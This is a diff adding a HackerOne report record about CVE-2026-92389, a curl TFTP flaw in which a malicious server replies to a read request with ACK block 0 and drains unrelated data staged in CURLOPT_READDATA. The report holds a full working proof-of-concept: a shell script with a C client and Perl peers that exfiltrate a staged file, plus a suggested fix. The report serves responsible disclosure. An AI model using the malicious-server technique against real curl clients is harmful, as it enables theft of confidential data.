@@ -1,0 +1,109 @@
+{
+  "id": 4022568,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDIyNTY4",
+  "url": "https://hackerone.com/reports/4022568",
+  "title": "CVE-2026-92389: TFTP direction confusion",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-11T18:33:14.291Z",
+  "submitted_at": "2026-09-11T18:33:14.432Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-92389"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-14T07:34:26.519Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-14T06:36:53.865Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\ncurl's TFTP state machine accepts either direction's opening response regardless of which one was requested. A malicious TFTP server can answer an RRQ with ACK block 0, which flips curl into transmit mode and causes it to drain whatever read source the handle's sticky `CURLOPT_READDATA` points at, including data staged for a completely unrelated transfer. Ordinary handle reuse across an HTTP POST and a TFTP download is sufficient; no TFTP-specific option is required.\n\n## The bug\n\n`tftp_send_first()` dispatches the peer's first reply without checking whether the direction matches what was requested:\n\n```c\n// lib/tftp.c:766-781\ncase TFTP_EVENT_ACK: /* only valid reply to WRQ — no upload check */\n  result = tftp_connect_for_tx(state, event);\n  break;\n\ncase TFTP_EVENT_DATA: /* only valid reply to RRQ — no upload check */\n  result = tftp_connect_for_rx(state, event);\n  break;\n```\n\nThe OACK branch above these checks `data->state.upload`. These two don't. Per RFC 1350, ACK block 0 is the correct reply only to WRQ; DATA block 1 only to RRQ. A peer answering an RRQ with ACK-0 flips curl into transmit mode unconditionally.\n\n## Impact path\n\nOnce in transmit, `tftp_tx()` calls `Curl_client_read()`, falling back to `data->state.fread_func`/`data->state.in` (`lib/sendf.c:1152-1179`) — i.e. `CURLOPT_READFUNCTION`/`CURLOPT_READDATA`. These are sticky options per `curl_easy_setopt(3)`. An earlier POST or MIME transfer on the same handle leaves a read source configured that the application never aimed at the TFTP transfer. A malicious peer drains it.\n\nVolume is bounded by sticky `infilesize`: a prior `CURLOPT_POSTFIELDS` body sets it to that body's length; a prior MIME body leaves it at `-1`, meaning drain to EOF.\n\nMeasured on `curl-8_22_0` and current `main` (staged file: `SECRET-STAGED-FILE-CONTENT`, 27 bytes):\n\n```\nmode=readdata   http_rc=0 tftp_rc=0\ndrained=16 capture=[SECRET-STAGED-FI]\n\nmode=reset      http_rc=0 tftp_rc=0\ndrained=0 capture=[]\n\nmode=conforming http_rc=0 tftp_rc=0\ndrained=0 capture=[]\n```\n\nBoth transfers return `CURLE_OK`. The 16-byte bound is the HTTP step's `CURLOPT_POSTFIELDS` length still set as `infilesize` — a length from one unrelated transfer bounding content from another. `reset` and `conforming` (honest peer) both drain nothing, isolating the cause to the peer's wrong-direction reply.\n\nNo redirect path: `CURLPROTO_REDIR` covers HTTP/HTTPS/FTP/FTPS only. Affects every TFTP-capable release from 7.15.0 (`56d9624b56`) through current `main`.\n\n## PoC\n\n```\nprivilege required: REMOTE (the trigger is the TFTP peer's opening reply)\nrun:     sh reproduce.sh readdata\ncontrol: sh reproduce.sh reset\n         sh reproduce.sh conforming\n```\n\nThe script runs an ordinary HTTP POST then reuses the same handle for a bare TFTP download. The adversarial TFTP peer answers RRQ with ACK block 0 instead of DATA block 1.\n\n```sh\n#!/bin/sh\nset -eu\nMODE=\"${1:?usage: $0 readdata|reset|conforming}\"\nSRC=\"${VF_SRC:-/src}\"\nWORK=\"${VF_WORK:-/tmp/vf-tftp-dir}\"\nmkdir -p \"$WORK\"\n\ncat > \"$WORK/poc3.c\" <<'EOF'\n#include <curl/curl.h>\n#include <stdio.h>\n#include <string.h>\nstatic const char benign[] = \"BENIGN-HTTP-BODY\";\nstatic size_t discard(char *p, size_t sz, size_t n, void *u)\n{ (void)p; (void)u; return sz * n; }\nint main(int argc, char **argv) {\n  const char *mode = argv[1], *http_url = argv[2], *tftp_url = argv[3];\n  const char *readdata_file = argv[4];\n  CURL *h = curl_easy_init();\n  CURLcode r1, r2;\n  curl_easy_setopt(h, CURLOPT_WRITEFUNCTION, discard);\n  curl_easy_setopt(h, CURLOPT_TIMEOUT, 10L);\n  if (strcmp(readdata_file, \"-\")) {\n    FILE *staged = fopen(readdata_file, \"rb\");\n    curl_easy_setopt(h, CURLOPT_READDATA, staged);\n  }\n  curl_easy_setopt(h, CURLOPT_POSTFIELDS, benign);\n  curl_easy_setopt(h, CURLOPT_URL, http_url);\n  r1 = curl_easy_perform(h);\n  if (!strcmp(mode, \"reset\")) {\n    curl_easy_reset(h);\n    curl_easy_setopt(h, CURLOPT_WRITEFUNCTION, discard);\n    curl_easy_setopt(h, CURLOPT_TIMEOUT, 10L);\n  }\n  curl_easy_setopt(h, CURLOPT_URL, tftp_url);\n  r2 = curl_easy_perform(h);\n  printf(\"mode=%s http_rc=%d tftp_rc=%d\\n\", mode, (int)r1, (int)r2);\n  curl_easy_cleanup(h);\n  return 0;\n}\nEOF\n\ncc -I\"$SRC/include\" \"$WORK/poc3.c\" -o \"$WORK/poc3\" \\\n  -L\"$SRC/lib/.libs\" -lcurl -Wl,-rpath,\"$SRC/lib/.libs\" || {\n    cc -I\"$SRC/include\" \"$WORK/poc3.c\" -o \"$WORK/poc3\" \\\n      \"$SRC/lib/.libs/libcurl.a\" -lz -lldap \\\n      -framework Security -framework CoreFoundation -framework SystemConfiguration\n  }\n\ncat > \"$WORK/http_peer.pl\" <<'EOF'\n#!/usr/bin/perl\nuse strict; use warnings; use IO::Socket::INET;\nmy ($port) = @ARGV;\nmy $l = IO::Socket::INET->new(LocalAddr=>'127.0.0.1', LocalPort=>$port,\n  Proto=>'tcp', Listen=>1, ReuseAddr=>1) or die \"listen: $!\\n\";\n$| = 1; print \"ready\\n\";\nmy $c = $l->accept or die \"accept: $!\\n\";\nmy $req = '';\nwhile ($req !~ /\\r\\n\\r\\n/) { my $g = sysread $c, my $b, 4096; last unless $g; $req .= $b; }\nprint $c \"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\nConnection: close\\r\\n\\r\\nok\";\nclose $c; close $l;\nEOF\n\ncat > \"$WORK/tftp_peer.pl\" <<'EOF'\n#!/usr/bin/perl\nuse strict; use warnings; use IO::Socket::INET; use IO::Select;\nmy ($mode, $port, $capture) = @ARGV;\nmy $sock = IO::Socket::INET->new(LocalAddr=>'127.0.0.1', LocalPort=>$port,\n  Proto=>'udp') or die \"bind: $!\\n\";\nmy $sel = IO::Select->new($sock);\nsub recv_packet { my ($t) = @_; return undef unless $sel->can_read($t);\n  my $peer = $sock->recv(my $buf, 2048); return undef unless defined $peer;\n  return ($buf, $peer); }\n$| = 1; print \"ready\\n\";\nmy ($packet, $peer) = recv_packet(15);\ndie \"no RRQ\\n\" unless defined $packet && unpack('n', $packet) == 1;\nopen my $out, '>:raw', $capture or die \"open: $!\\n\";\nif ($mode eq 'rrq-data') {\n  $sock->send(pack('nn', 3, 1) . \"benign-file\", 0, $peer);\n} else {\n  $sock->send(pack('nn', 4, 0), 0, $peer);\n  while (1) {\n    my ($data, $from) = recv_packet(10);\n    last unless defined $data;\n    my ($op, $block) = unpack 'nn', $data;\n    last unless $op == 3;\n    $peer = $from;\n    my $payload = substr $data, 4;\n    print $out $payload;\n    $sock->send(pack('nn', 4, $block), 0, $peer);\n    last if length($payload) < 512;\n  }\n}\nclose $out; close $sock;\nEOF\n\nprintf 'SECRET-STAGED-FILE-CONTENT' > \"$WORK/secret_file\"\n\nHTTP_PORT=7101 TFTP_PORT=7102\nperl \"$WORK/http_peer.pl\" \"$HTTP_PORT\" > \"$WORK/http.log\" 2>&1 &\nHPID=$!\nif [ \"$MODE\" = \"conforming\" ]; then TFTP_MODE=rrq-data; else TFTP_MODE=rrq-ack; fi\nperl \"$WORK/tftp_peer.pl\" \"$TFTP_MODE\" \"$TFTP_PORT\" \"$WORK/capture\" > \"$WORK/tftp.log\" 2>&1 &\nTPID=$!\nfor _ in 1 2 3 4 5 6 7 8; do\n  grep -q ready \"$WORK/http.log\" 2>/dev/null && grep -q ready \"$WORK/tftp.log\" 2>/dev/null && break\n  sleep 0.2\ndone\n\nCLIENT_MODE=\"$MODE\"; [ \"$MODE\" = \"conforming\" ] && CLIENT_MODE=\"readdata\"\n\"$WORK/poc3\" \"$CLIENT_MODE\" \"http://127.0.0.1:$HTTP_PORT/post\" \\\n  \"tftp://127.0.0.1:$TFTP_PORT/f\" \"$WORK/secret_file\"\n\nwait \"$HPID\" \"$TPID\" 2>/dev/null || true\necho \"drained=$(wc -c < \"$WORK/capture\" 2>/dev/null | tr -d ' ') capture=[$(cat \"$WORK/capture\" 2>/dev/null)]\"\n```\n\n## Suggested fix\n\nSomething like this:\n\n```c\ncase TFTP_EVENT_ACK:\n  if(!data->state.upload)\n    return CURLE_TFTP_ILLEGAL;\n  result = tftp_connect_for_tx(state, event);\n  break;\n\ncase TFTP_EVENT_DATA:\n  if(data->state.upload)\n    return CURLE_TFTP_ILLEGAL;\n  result = tftp_connect_for_rx(state, event);\n  break;\n```\n\nThis closes the confidentiality path. The mirror case( WRQ answered with DATA) also needs fixing: `tftp_receive_packet()` (`lib/tftp.c:1079-1091`) writes DATA packets to `Curl_client_write()` with no `state->upload` check, and runs *before* the state machine (`lib/tftp.c:1203-1207`). A direction check there and a `CURLE_TFTP_ILLEGAL` return in `tftp_tx()`'s default branch are needed to make the patch complete. No separate security claim for the mirror case — a conforming server can already ACK an upload and discard it.\n\nA regression test asserting RRQ never invokes `Curl_client_read()` and WRQ never delivers peer DATA to the download writer would close the loop.\n\nCheers,\nJosh\n\n## Impact\n\nA TFTP peer the application deliberately contacted can receive data staged in `CURLOPT_READDATA` for a later upload, a POST body, or stdin — without any TFTP-specific option aimed at the TFTP transfer. Ordinary handle reuse or a multi-URL invocation is sufficient. The identical setup against a conforming server leaks nothing. Nothing here reaches memory safety.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
